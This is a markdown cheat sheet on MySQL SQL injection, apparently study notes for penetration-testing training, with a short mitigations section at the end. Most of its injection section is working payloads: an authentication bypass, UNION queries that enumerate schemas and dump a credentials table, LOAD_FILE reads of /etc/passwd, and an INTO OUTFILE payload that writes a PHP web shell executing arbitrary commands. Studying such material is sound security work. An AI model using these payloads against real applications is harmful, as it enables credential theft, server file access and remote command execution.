

# Fingerprinting

| Payload            | When to Use                      | Expected Output                                     | Wrong Output                                              |
| ------------------ | -------------------------------- | --------------------------------------------------- | --------------------------------------------------------- |
| `SELECT @@version` | When we have full query output   | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'     | In MSSQL it returns MSSQL version. Error with other DBMS. |
| `SELECT POW(1,1)`  | When we only have numeric output | `1`                                                 | Error with other DBMS                                     |
| `SELECT SLEEP(5)`  | Blind/No Output                  | Delays page response for 5 seconds and returns `0`. |                                                           |
## INFORMATION_SCHEMA
```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

# Statements
## Insert
```sql
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
```

## Select

```sql
SELECT column1, column2 FROM table_name;
```

## Drop

```sql
DROP TABLE logins;
```
\
## Alter

```sql
ALTER TABLE logins RENAME column newColumn TO oldColumn;
ALTER TABLE logins ADD newColumn INT;
ALTER TABLE logins DROP oldColumn;
```

## Update

```sql
UPDATE table_name SET column1=newvalue WHERE <condition>;
```

# Query Results
## Sorting
```sql
SELECT * FROM logins ORDER by password;
SELECT * FROM logins ORDER by password desc;
```

## Limit

```sql
SELECT * FROM logins LIMIT 2;
```

## Where
```sql
SELECT * FROM logins where username = 'admin';
```

## LIKE

```sql
SELECT * FROM logins WHERE username LIKE 'admin%';
```

# Injections
## Basic

```sql
admin' OR '1'='1
```
## Comments
```sql
--
```

## Unions
### Detect Number of Columns

- The number is the column number. Keep running this until you get a unknown column number. 

```sql
' order by 1-- 
```

### Using UNION

- Add the number of columns you found above in the select here.

```sql
cn' UNION select 1,2,3,-- 
```

```sql
cn' UNION select 1,@@version,3,4-- 
```

```sql
cn' UNION select 1,user(),3,4-- 
```

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

```sql
cn' UNION select 1,username,password,4 from dev.credentials-- 
```

### Reading Files
#### Privileges
##### Get User
```sql
cn' UNION SELECT 1, user(),3,4 -- -
```

##### Super privileges?
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

#### LOAD_FILE

```sql
SELECT LOAD_FILE('/etc/passwd')

cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"),3,4-- -
```

### Writing Files
To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

#### secure_file_priv
The [secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) variable is used to determine where to read/write files from.

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```
```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

#### SELECT INTO OUTFILE
```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

##### Webshell

```sql
cn' union select "",'<?php system($_REQUEST["cmd"]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

# Mitigations

## Input Sanitization
```php
```php
<SNIP>
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);

$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
echo "Executing query: " . $query . "<br /><br />";
<SNIP>
``````

## Input Validation
```php
<SNIP>
$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];

if(!preg_match($pattern, $code)) {
  die("</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
}

$q = "Select * from ports where port_code ilike '%" . $code . "%'";
<SNIP>
```

## Parameterized Queries
The query is modified to contain two placeholders, marked with `?` where the username and password will be placed. We then bind the username and password to the query using the [mysqli_stmt_bind_param()](https://www.php.net/manual/en/mysqli-stmt.bind-param.php) function. This will safely escape any quotes and place the values in the query.
```php
<SNIP>
  $username = $_POST['username'];
  $password = $_POST['password'];

  $query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
  $stmt = mysqli_prepare($conn, $query);
  mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
  mysqli_stmt_execute($stmt);
  $result = mysqli_stmt_get_result($stmt);

  $row = mysqli_fetch_array($result);
  mysqli_stmt_close($stmt);
<SNIP>
```

# Tips
- You can use the "describe" function to get a schema.
